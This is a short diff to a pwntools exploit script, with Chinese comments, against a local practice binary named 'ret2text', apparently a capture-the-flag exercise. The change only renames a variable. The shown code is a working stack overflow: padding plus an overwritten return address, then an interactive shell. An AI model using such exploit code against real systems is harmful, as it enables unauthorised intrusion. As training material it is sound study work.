@@ -60,10 +60,10 @@ io = process("ret2text")
 io.recvline()
 
 #构造覆盖返回地址的字符串，注意要将数据转为字节的形式
-overflow = b'AAAA' * 5 + p32(0x8048522)
+payload = b'AAAA' * 5 + p32(0x8048522)
 
 #发送构造的数据
-io.sendline(overflow)
+io.sendline(payload)
 
 #获取shell交互权限
 io.interactive()
